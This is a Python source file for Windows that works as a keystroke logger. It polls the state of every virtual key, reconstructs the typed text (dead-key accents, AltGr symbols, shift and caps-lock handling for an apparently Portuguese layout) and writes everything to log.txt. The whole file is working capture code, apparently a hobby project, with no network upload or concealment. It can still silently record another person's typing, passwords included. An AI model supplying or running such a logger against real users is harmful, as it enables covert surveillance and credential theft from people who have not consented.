"""
Created on 07-03-2016

@author: sceptross
"""
import codecs
import win32api
import ctypes

VK_CODE = {'backspace': 0x08,
           'tab': 0x09,
           'clear': 0x0C,
           'enter': 0x0D,
           'pause': 0x13,
           'caps_lock': 0x14,
           'esc': 0x1B,
           'space_bar': 0x20,
           'page_up': 0x21,
           'page_down': 0x22,
           'end': 0x23,
           'home': 0x24,
           'left_arrow': 0x25,
           'up_arrow': 0x26,
           'right_arrow': 0x27,
           'down_arrow': 0x28,
           'select': 0x29,
           'print': 0x2A,
           'execute': 0x2B,
           'print_screen': 0x2C,
           'ins': 0x2D,
           'del': 0x2E,
           'help': 0x2F,
           '0': 0x30,
           '1': 0x31,
           '2': 0x32,
           '3': 0x33,
           '4': 0x34,
           '5': 0x35,
           '6': 0x36,
           '7': 0x37,
           '8': 0x38,
           '9': 0x39,
           'a': 0x41,
           'b': 0x42,
           'c': 0x43,
           'd': 0x44,
           'e': 0x45,
           'f': 0x46,
           'g': 0x47,
           'h': 0x48,
           'i': 0x49,
           'j': 0x4A,
           'k': 0x4B,
           'l': 0x4C,
           'm': 0x4D,
           'n': 0x4E,
           'o': 0x4F,
           'p': 0x50,
           'q': 0x51,
           'r': 0x52,
           's': 0x53,
           't': 0x54,
           'u': 0x55,
           'v': 0x56,
           'w': 0x57,
           'x': 0x58,
           'y': 0x59,
           'z': 0x5A,
           'num_pad_0': 0x60,
           'num_pad_1': 0x61,
           'num_pad_2': 0x62,
           'num_pad_3': 0x63,
           'num_pad_4': 0x64,
           'num_pad_5': 0x65,
           'num_pad_6': 0x66,
           'num_pad_7': 0x67,
           'num_pad_8': 0x68,
           'num_pad_9': 0x69,
           'multiply_key': 0x6A,
           'add_key': 0x6B,
           'separator_key': 0x6C,
           'subtract_key': 0x6D,
           'decimal_key': 0x6E,
           'divide_key': 0x6F,
           'F1': 0x70,
           'F2': 0x71,
           'F3': 0x72,
           'F4': 0x73,
           'F5': 0x74,
           'F6': 0x75,
           'F7': 0x76,
           'F8': 0x77,
           'F9': 0x78,
           'F10': 0x79,
           'F11': 0x7A,
           'F12': 0x7B,
           'F13': 0x7C,
           'F14': 0x7D,
           'F15': 0x7E,
           'F16': 0x7F,
           'F17': 0x80,
           'F18': 0x81,
           'F19': 0x82,
           'F20': 0x83,
           'F21': 0x84,
           'F22': 0x85,
           'F23': 0x86,
           'F24': 0x87,
           'num_lock': 0x90,
           'scroll_lock': 0x91,
           'left_shift': 0xA0,
           'right_shift': 0xA1,
           'left_control': 0xA2,
           'right_control': 0xA3,
           'left_menu': 0xA4,
           'right_menu': 0xA5,
           'browser_back': 0xA6,
           'browser_forward': 0xA7,
           'browser_refresh': 0xA8,
           'browser_stop': 0xA9,
           'browser_search': 0xAA,
           'browser_favorites': 0xAB,
           'browser_start_and_home': 0xAC,
           'volume_mute': 0xAD,
           'volume_Down': 0xAE,
           'volume_up': 0xAF,
           'next_track': 0xB0,
           'previous_track': 0xB1,
           'stop_media': 0xB2,
           'play/pause_media': 0xB3,
           'start_mail': 0xB4,
           'select_media': 0xB5,
           'start_application_1': 0xB6,
           'start_application_2': 0xB7,
           'attn_key': 0xF6,
           'cr_sel_key': 0xF7,
           'ex_sel_key': 0xF8,
           'play_key': 0xFA,
           'zoom_key': 0xFB,
           'clear_key': 0xFE,
           '+': 0xBB,
           ',': 0xBC,
           '-': 0xBD,
           '.': 0xBE,
           '`': 0xC0,
           "'": 0xDB,
           '\\': 0xDC,
           '<': 0xE2,
           }

VK_DEAD_KEY_CODE = {
    '~': 0xBF,
    u'\u00B4': 0xBA,
}

VK_NON_ASCII_CODE = {
    u'\u00BA': 0xDE,
    u'\u00AB': 0xDD,
    u'\u00C7': 0xC0
}

printable_non_alphanumeric = ['+', ',', '-', '.', "'", '\\', '<']
shift_printable_non_alphanumeric = {
    '+': '*',
    ',': ';',
    '-': '_',
    '.': ':',
    "'": '?',
    '\\': '|',
    '<': '>'
}
shift_printable_numeric = ['=', '!', '"', '#', '$', '%', '&', '/', '(', ')']
shift_dead_keys = {'~': '^', u'\u00B4': '`'}
alt_gr_numeric = ['}', '', '@', u'\u00A3', u'\u00A7', u'\u20AC', '', '{', '[', ']']
alt_gr_non_numeric = {'e': u'\u20AC'}
keysPressed = {}
wasKeyPressedTheLastTimeWeChecked = {}
keysDown = []
dead_key = ''
all_keys = VK_CODE.copy()
all_keys.update(VK_NON_ASCII_CODE)
all_keys.update(VK_DEAD_KEY_CODE)
locks_state = {'caps_lock': False,
               'num_lock': False,
               'scroll_lock': False}
buf = ""
ctrl = ['left_control', 'right_control']
alt = ['left_menu', 'right_menu']
shift = ['left_shift', 'right_shift']


def dead_key_handler(k, shift_state=0):
    global buf
    global dead_key

    if k != u'\u00A8' and (ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed()):
        return

    tilde = {
        'a': (u'\u00E3', u'\u00C3'),
        'o': (u'\u00F5', u'\u00D5'),
        'n': (u'\u00F1', u'\u00D1')
    }

    circumflex = {
        'a': (u'\u00E2', u'\u00C2'),
        'e': (u'\u00EA', u'\u00CA'),
        'i': (u'\u00EE', u'\u00CE'),
        'o': (u'\u00F4', u'\u00D4'),
        'u': (u'\u00FB', u'\u00DB')
    }

    acute = {
        'a': (u'\u00E1', u'\u00C1'),
        'e': (u'\u00E9', u'\u00C9'),
        'i': (u'\u00ED', u'\u00CD'),
        'o': (u'\u00F3', u'\u00D3'),
        'u': (u'\u00FA', u'\u00DA')
    }

    grave = {
        'a': (u'\u00E0', u'\u00C0'),
        'e': (u'\u00E8', u'\u00C8'),
        'i': (u'\u00EC', u'\u00CC'),
        'o': (u'\u00F2', u'\u00D2'),
        'u': (u'\u00F9', u'\u00D9')
    }

    diaeresis = {
        'a': (u'\u00E4', u'\u00C4'),
        'e': (u'\u00EB', u'\u00CB'),
        'i': (u'\u00EF', u'\u00CF'),
        'o': (u'\u00F6', u'\u00D6'),
        'u': (u'\u00FC', u'\u00DC')
    }

    dead_keys = {
        '~': tilde,
        '^': circumflex,
        u'\u00B4': acute,
        '`': grave,
        u'\u00A8': diaeresis
    }

    if dead_key in dead_keys:
        if k in dead_keys[dead_key]:
            buf += dead_keys[dead_key][k][shift_state % 2]
        else:
            buf += (dead_key + k)
    else:
        buf += (dead_key + k)

    dead_key = ''


def key_was_unpressed(k):
    keysDown.remove(k)


def key_was_pressed(k):
    global dead_key
    keysDown.append(k)

    if k in VK_DEAD_KEY_CODE or (k == '+' and get_alt_gr_pressed()):
        if dead_key != '':
            if k == '+' and get_alt_gr_pressed():
                dead_key_handler(u'\u00A8')
            else:
                dead_key_handler(k)
        elif ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
            dead_key = shift_dead_keys[k]
        elif k == '+' and get_alt_gr_pressed():
            dead_key = u'\u00A8'
        else:
            dead_key = k
        return

    log_char(k)


def is_key_pressed(k):
    # if the high-order bit is 1, the key is down; otherwise, it is up
    return (win32api.GetKeyState(k) & (1 << 7)) != 0


def is_alphanumeric(k):
    if len(k) != 1:
        return False
    return (0x30 <= ord(k) <= 0x39) or (0x61 <= ord(k) <= 0x7a)


def is_alpha(k):
    if len(k) != 1:
        return False
    return 0x61 <= ord(k) <= 0x7a


def is_numeric(k):
    if len(k) != 1:
        return False
    return 0x30 <= ord(k) <= 0x39


def is_num_lock_key(k):
    return 0x60 <= all_keys[k] <= 0x6F


# Queries the Windows API to know which of the lock keys are turned on
def set_locks_state():
    hll_dll = ctypes.WinDLL("User32.dll")
    locks_state['caps_lock'] = bool(hll_dll.GetKeyState(0x14))
    locks_state['num_lock'] = bool(hll_dll.GetKeyState(0x90))
    locks_state['scroll_lock'] = bool(hll_dll.GetKeyState(0x91))


def log_char(key_down):
    global buf

    alt_gr = get_alt_gr_pressed()
    # If alt gr, a control, an alt or both shift keys are pressed, nothing is typed, unless in the case of an alt gr +
    # key combination, so it's useless to go on except in that case
    if alt_gr:
        if is_numeric(key_down):
            buf += alt_gr_numeric[int(key_down)]
        elif key_down in alt_gr_non_numeric:
            buf += alt_gr_non_numeric[key_down]
        return

    if ctrl_key_pressed() or alt_key_pressed() or shift_keys_pressed():
        return

    if key_down == 'space_bar':
        buf += ' '
        return
    elif key_down == 'enter':
        buf += '\r\n'
        return
    elif key_down == 'backspace':
        buf += '[backspace]'
        return

    # Check num lock keys
    if locks_state['num_lock'] and is_num_lock_key(key_down):
        num_lock_keys = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '*', '+', '.', '-', ',', '/']
        buf += num_lock_keys[all_keys[key_down] - 0x60]
        return

    # Count the number of shift keys pressed to know what was typed
    shift_state = 0

    if is_alpha(key_down):
        if ('left_shift' in keysDown) ^ ('right_shift' in keysDown):
            shift_state += 1
        if locks_state['caps_lock']:
            shift_state += 1
        if dead_key != '':
            dead_key_handler(key_down, shift_state)
        elif shift_state % 2 == 1:
            buf += key_down.upper()
        else:
            buf += key_down.lower()
    else:
        if dead_key != '':
            dead_key_handler(key_down)
        elif is_numeric(key_down):
            if shift_state % 2 == 1:
                buf += shift_printable_numeric[int(key_down)]
            else:
                buf += key_down
        elif key_down in printable_non_alphanumeric:
            if shift_state % 2 == 1:
                buf += shift_printable_non_alphanumeric[key_down]
            else:
                buf += key_down
        elif key_down in VK_NON_ASCII_CODE:
            buf += key_down


def get_alt_gr_pressed():
    # Check if alt gr / ctrl + alt combo is pressed
    alt_gr = 'right_menu' in keysDown
    if not alt_gr:
        for k in ctrl:
            if k in keysDown:
                for l in alt:
                    if l in keysDown:
                        alt_gr = True
    return alt_gr


def ctrl_key_pressed():
    return (ctrl[0] in keysDown) or (ctrl[1] in keysDown)


def alt_key_pressed():
    return (alt[0] in keysDown) or (alt[1] in keysDown)


def shift_keys_pressed():
    return (shift[0] in keysDown) and (shift[1] in keysDown)


def init():
    set_locks_state()
    for key in all_keys:
        keysPressed[key] = False
        wasKeyPressedTheLastTimeWeChecked[key] = False


def write_to_log():
    try:
        f = open("log.txt", "w")
        f.close()
        with codecs.open("log.txt", "w", 'UTF-8') as f:
            f.write(buf)
    except:
        write_to_log()
        raise


def main():
    init()
    while True:
        try:
            if ctrl_key_pressed() and 'c' in keysDown:
                break
            for k in all_keys:
                key_is_pressed = is_key_pressed(all_keys[k])
                if key_is_pressed and not wasKeyPressedTheLastTimeWeChecked[k]:
                    key_was_pressed(k)
                    keysPressed[k] = True
                    wasKeyPressedTheLastTimeWeChecked[k] = True
                    if k == 'caps_lock' or k == 'num_lock' or k == 'scroll_lock':
                        locks_state[k] = not locks_state[k]
                if not key_is_pressed and wasKeyPressedTheLastTimeWeChecked[k]:
                    key_was_unpressed(k)
                    keysPressed[k] = False
                    wasKeyPressedTheLastTimeWeChecked[k] = False
        except:
            write_to_log()
            raise
    write_to_log()

main()
